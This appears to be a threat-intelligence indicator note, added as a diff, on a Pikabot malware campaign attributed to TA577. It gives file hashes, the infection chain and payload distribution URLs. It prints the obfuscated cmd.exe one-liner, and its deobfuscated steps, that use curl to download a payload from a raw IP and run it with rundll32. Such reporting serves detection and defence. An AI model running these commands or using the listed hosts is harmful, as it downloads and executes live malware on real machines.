@@ -1,0 +1,41 @@
+01.11.2023 | Pikabot | TA577 | 1.1.15-ghost
+
+*************************************************
+
+.js 00dceb3bc7a64da6efb7eb28a43e52ac056053bb07254224d9121e8968c37f37
+.dll 170a98b485ccf23969b2d5260101f437f6190f6be7512749d46e0c1fbe2ef61f
+
+*************************************************
+
+zip > js > curl > dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\dolor.js
+
+cmd.exe" /c AJl || EchO AJl & PiNg AJl || cURL http://64.176.193.25/i1DQR/Serge -o %tmP%\AJl.sct & PiNg -n 3 AJl || RuNDlL32 %TmP%\AJl.sct, Crash & eXiT KRuHQVSL4E
+
+PiNg  AJl 
+
+cURL http://64.176.193.25/i1DQR/Serge -o C:\Users\Admin\AppData\Local\Temp\AJl.sct 
+
+PiNg  -n 3 AJl 
+
+RuNDlL32 C:\Users\Admin\AppData\Local\Temp\AJl.sct, Crash
+
+*************************************************
+
+.dll distro
+
+http://45.77.79.67/amywa/nonas
+http://49.13.94.147/1wsnrcv/lyotr
+http://64.176.193.25/i1dqr/serge
+http://64.176.212.255/jjku/pagan
+
+*************************************************
+
+c2's
+
+
+
+HTTPS Checking Traffic 
+
+
